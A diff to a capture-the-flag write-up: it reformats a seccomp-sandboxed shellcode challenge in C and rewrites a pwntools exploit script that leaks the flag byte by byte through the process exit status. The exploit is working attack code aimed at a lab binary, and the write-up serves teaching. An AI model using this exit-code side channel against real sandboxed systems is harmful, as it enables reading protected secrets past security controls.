@@ -15,47 +15,41 @@
 == Challenge Source Code
 
 ```c
-#define _GNU_SOURCE 1
-
-#include <stdlib.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <time.h>
-#include <errno.h>
 #include <assert.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdint.h>
 #include <sys/mman.h>
 #include <sys/sendfile.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
 #include <seccomp.h>
 
-int main(int argc, char **argv, char **envp)
-{
-    assert(argc > 1);
+int main(int argc, char **argv, char **envp) {
+  assert(argc > 1);
 
-    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);
 
-    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
-    assert(shellcode == (void *)0x1337000);
+  void *shellcode =
+      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
+           MAP_PRIVATE | MAP_ANON, 0, 0);
+  assert(shellcode == (void *)0x1337000);
 
-    int shellcode_size = read(0, shellcode, 0x1000);
+  int shellcode_size = read(0, shellcode, 0x1000);
 
-    scmp_filter_ctx ctx;
+  scmp_filter_ctx ctx;
 
-    ctx = seccomp_init(SCMP_ACT_KILL);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);
+  ctx = seccomp_init(SCMP_ACT_KILL);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);
 
-    assert(seccomp_load(ctx) == 0);
+  assert(seccomp_load(ctx) == 0);
 
-    ((void(*)())shellcode)();
+  ((void (*)())shellcode)();
 }
 ```
 
@@ -67,9 +61,9 @@ However, the `exit` syscall takes an integer argument (the exit status), which i
 
 == Exploitation Plan
 
-1.  *Read Flag:* Use the `read` syscall to read the flag from the pre-opened file descriptor (FD 3) into memory.
-2.  *Leak Byte:* Select a specific byte from the read buffer and use it as the argument for the `exit` syscall.
-3.  *Automation:* Write a script to run the binary repeatedly, incrementing the index of the byte to leak, and capturing the process's exit code each time.
+1. *Read Flag:* Use the `read` syscall to read the flag from the pre-opened file descriptor (FD 3) into memory.
+2. *Leak Byte:* Select a specific byte from the read buffer and use it as the argument for the `exit` syscall.
+3. *Automation:* Write a script to run the binary repeatedly, incrementing the index of the byte to leak, and capturing the process's exit code each time.
 
 == Exploit Script
 
@@ -79,41 +73,33 @@ from pwn import *
 exe = "./challenge"
 context.binary = exe
 
-flag = ""
-index = 0
-
-while True:
-    # Shellcode to read flag and exit with byte at 'index'
-    shellcode = asm(f"""
-        /* read(3, stack, 100) */
-        mov rdi, 3          /* fd: 3 */
-        mov rsi, rsp        /* buffer */
-        mov rdx, 100        /* count */
-        mov rax, 0          /* syscall: SYS_read */
-        syscall
-
-        /* exit(buffer[index]) */
-        movzx rdi, byte ptr [rsp + {index}]
-        mov rax, 60         /* syscall: SYS_exit */
-        syscall
-    """)
-
-    # Run with /flag as argument to open it on FD 3
+def get_byte(index):
     p = process([exe, "/flag"], level='error')
-    p.send(shellcode)
-    
-    # Wait for process to exit and get the exit code
-    p.wait()
-    exit_code = p.poll()
-    p.close()
 
-    # Null terminator or error implies end of string
-    if exit_code <= 0:
+    # 1. read(3, 0x1337800, 100)
+    sc = shellcraft.read(3, 0x1337800, 100)
+
+    # 2. Extract byte at index and move to rdi for exit()
+    # Shellcraft doesn't have a direct "exit with byte from memory" helper,
+    # so we use a small assembly bridge.
+    sc += f"movzx rdi, byte ptr [0x1337800 + {index}]"
+
+    # 3. exit(rdi)
+    sc += shellcraft.exit('rdi')
+
+    p.send(asm(sc))
+    p.wait_for_close()
+    return p.poll()
+
+flag = ""
+for i in range(100):
+    b = get_byte(i)
+    if b == 0 or b is None:
         break
-        
-    flag += chr(exit_code)
+    flag += chr(b)
     print(f"Leaked: {flag}")
-    index += 1
+    if flag.endswith('\n'):
+        break
 
-print(f"Final Flag: {flag}")
+print(f"\nFinal Flag: {flag}")
 ```
